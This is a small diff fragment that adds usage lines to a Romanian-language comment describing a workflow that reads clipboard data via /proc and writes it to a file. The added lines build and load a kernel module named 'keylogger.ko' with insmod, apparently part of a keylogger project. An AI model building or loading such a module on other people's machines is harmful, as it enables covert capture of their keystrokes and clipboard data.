@@ -52,3 +52,7 @@ Workflow complet: De la /proc la procesare
         Procesează datele din clipboard_work.
         Scrie datele în fișier cu write_to_file.
         Eliberează memoria.
+
+    Usage:
+        make
+        insmod keylogger.ko
